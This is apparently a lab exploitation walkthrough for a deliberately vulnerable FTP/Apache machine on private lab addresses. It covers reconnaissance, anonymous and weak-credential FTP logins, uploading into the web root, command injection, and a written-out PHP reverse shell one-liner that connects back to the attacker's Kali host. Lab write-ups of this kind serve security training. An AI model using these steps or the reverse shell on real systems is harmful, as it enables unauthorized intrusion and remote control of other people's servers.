## Exploitation Guide
FTP machine: 10.0.12.231
Kali machine: 10.0.12.171

## Reconnaissance
nmap -p 21 10.0.12.231

<img width="626" height="676" alt="image" src="https://github.com/user-attachments/assets/ed83388e-415f-4951-927d-2d7de9e1fbfc" />


## Vulnerbilities + Exploits
# Anonymous Login
- ftp 10.0.12.231
- Name: anonymous
- Password: *blank*
<img width="399" height="204" alt="image" src="https://github.com/user-attachments/assets/3608f003-2ef8-4754-a8ac-b9bc38061f72" />


# FTP Weak Credentials
- ftp <target>
- Name: ftpuser
- Password: password123
- Once the username is found, the password is brute forced in 5 minutes
<img width="812" height="654" alt="image" src="https://github.com/user-attachments/assets/41b8e3d0-e664-4fe5-99b8-97859be3024d" />

# FTP Write Access to Apache Web Root
 1. Kali:
 - ftp 10.0.12.231
 - Name: ftpuser
 - Password: password123
 - cd /var/www/html
 - put test.txt

 2. FTP:
 - ls /var/www/html
 - (test.txt shows in Apache web root)

# Localhost URL Parameter exploit
Index.php hosted at localhost of FTP machine send all uri arguments to cmd

<img width="563" height="236" alt="image" src="https://github.com/user-attachments/assets/be9e536c-7360-4d2b-9330-d88ef7f2d365" />

# /var/www/html/uploads shell.php Attack
1. Kali:
- nc -lvnp 4444 [Setup NetCat listener]
- Create shell.php
- php -r '$s=fsockopen("10.0.12.171",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");' 
- ftp 10.0.12.231
- Name: ftpuser
- Password: password123
- cd /var/www/html/uploads
- put shell.php
- browse to 10.0.12.231/uploads/shell.php

- the FTP machine should connect to the nc listener on the Kali machine
<img width="785" height="223" alt="image" src="https://github.com/user-attachments/assets/fee6d3d7-5763-4d98-9ea3-a5501adcec58" />
<img width="1125" height="329" alt="image" src="https://github.com/user-attachments/assets/54b31db4-942d-4617-af82-7714b81a77e9" />

# OS Command Injection
- There is a form on the local webpage that passes inputs directly into CMD
- This allows an attacker to input php reverse shell commands to get more access into the machine
<img width="643" height="407" alt="image" src="https://github.com/user-attachments/assets/b7ec1ded-8adb-4eaa-b342-5fe68ce5b960" />


# /etc/passwd exposed
<img width="1265" height="510" alt="image" src="https://github.com/user-attachments/assets/7eaa93bc-1bef-4aa8-8e59-7986f357f0ab" />



